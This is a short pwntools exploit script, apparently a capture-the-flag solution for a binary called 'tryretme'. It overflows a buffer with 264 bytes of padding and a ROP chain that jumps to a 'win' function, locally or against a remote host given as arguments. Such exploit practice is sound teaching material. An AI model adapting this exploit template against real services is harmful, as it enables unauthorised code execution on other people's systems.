from pwn import *

def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)

gdbscript = '''
b *vuln+66
continue
'''

exe = './tryretme'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

rop=ROP(elf)

ret_addr=rop.find_gadget(['ret'])[0]
rop.raw(ret_addr)

rop.win()

print(rop.dump())

rop_chain = rop.chain()

padding = 264

payload = flat({padding : rop_chain})

io = start()

io.sendlineafter(b'Return to where? :', payload)

io.interactive()

